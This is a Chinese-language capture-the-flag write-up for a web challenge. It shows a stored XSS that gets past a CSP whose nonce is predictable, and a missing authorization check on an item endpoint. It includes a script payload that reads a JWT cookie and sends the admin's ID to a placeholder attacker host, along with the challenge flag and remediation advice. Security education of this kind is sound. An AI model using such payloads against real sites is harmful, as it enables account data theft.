# yolo

## 题目简述

用户可保存 `name` 与 `toDo`，他人查看时模板用 EJS 原样输出这两个字段，存在存储型 XSS。页面设置基于 nonce 的 CSP，但 nonce 被保存在可读、可预测演进的 JWT payload 中：初始常量每次请求只做一次 SHA-256。管理员会先创建一个 `toDo=flag` 的私有条目，再访问攻击者提交的同源 URL。

## 解题过程

首次无 cookie 的请求不会进入 nonce 计算分支，只签发空 JWT。攻击者创建条目并跟随重定向时，自己的请求序列将 nonce 哈希两次；管理员完成“主页 → 提交 → 自己条目 → 攻击条目”后，访问攻击条目时使用常量的第三次 SHA-256。预先计算该值：

```python
import hashlib

nonce = "47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d"
for _ in range(3):
    nonce = hashlib.sha256(nonce.encode()).hexdigest()
```

把带正确 nonce 的脚本存入 `name`，让管理员浏览时从非 HttpOnly JWT cookie 的 payload 读取 `userId` 并外带：

```html
<script nonce="CALCULATED_NONCE">
const payload = JSON.parse(atob(document.cookie.split('.')[1]));
location = 'https://ATTACKER/?id=' + payload.userId;
</script>
```

拿到管理员 UUID 后，`/do/:id` 没有鉴权，直接请求其条目即可看到 `toDo` 中的 flag：

```text
tjctf{y0u_0n1y_1iv3_0nc3_5ab61b33}
```

## 方法总结

- CSP nonce 必须为每个响应独立生成的高熵随机值，不能从客户端可见状态确定性演进。
- XSS 先泄露管理员对象 ID，再利用未授权读取接口取 flag；cookie 本身只含定位信息，不应把两阶段混写成“cookie 直接存 flag”。
- 修复还应对模板变量做 HTML 转义、设置 HttpOnly cookie，并验证 `/do/:id` 的对象所有权。
